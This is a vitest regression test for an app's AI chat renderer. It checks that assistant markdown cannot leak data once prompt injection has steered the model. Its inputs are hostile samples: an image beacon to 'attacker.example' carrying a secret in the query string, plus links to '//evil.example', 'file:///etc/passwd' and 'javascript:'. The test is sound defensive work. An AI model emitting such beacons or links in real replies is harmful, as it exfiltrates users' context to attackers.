// @vitest-environment jsdom
/**
 * Security regression: assistant replies are model output, and the model sees
 * prompt-injectable context (response bodies, docs). Rendering them as markdown
 * must not fetch anything with zero clicks (an `<img>` beacon carrying context
 * in its query string), nor link to protocol-relative / file: / script URLs
 * (on the packaged file:// origin `//host/x` resolves to file://host — an
 * SMB/NTLM leak on Windows).
 */
import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import MarkdownPreview from '@/components/shared/MarkdownPreview';
import { Message } from '@/features/ai/components/Message';
import type { ChatMessage } from '@/features/ai/store';

const assistant = (text: string): ChatMessage => ({
  id: 'a1',
  role: 'assistant',
  text,
  status: 'done',
  createdAt: 0,
});

describe('assistant markdown cannot exfiltrate', () => {
  it('renders no <img> for an image in an assistant reply', () => {
    const { container } = render(
      <Message
        message={assistant(
          'Here you go ![leak](https://attacker.example/p?d=secret) and ![x](//host/share/x.png)'
        )}
      />
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('leak');
  });

  it.each([
    ['protocol-relative', '[x](//evil.example/a)'],
    ['file:', '[x](file:///etc/passwd)'],
    ['javascript:', '[x](javascript:alert(1))'],
    ['relative', '[x](../share/a)'],
  ])('neutralises a %s link', (_label, md) => {
    const { container } = render(<Message message={assistant(md)} />);
    for (const a of Array.from(container.querySelectorAll('a'))) {
      const href = a.getAttribute('href');
      expect(href === null || href === '').toBe(true);
    }
    expect(container.textContent).toContain('x');
  });

  it('keeps absolute http(s) and mailto links working', () => {
    const { container } = render(
      <Message
        message={assistant(
          '[docs](https://example.com/docs) [plain](http://example.com) [mail](mailto:a@example.com)'
        )}
      />
    );
    const hrefs = Array.from(container.querySelectorAll('a')).map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual([
      'https://example.com/docs',
      'http://example.com',
      'mailto:a@example.com',
    ]);
  });

  it('leaves trusted (default) MarkdownPreview callers unchanged', () => {
    const { container } = render(<MarkdownPreview source="![logo](https://example.com/l.png)" />);
    expect(container.querySelector('img')?.getAttribute('src')).toBe('https://example.com/l.png');
  });
});
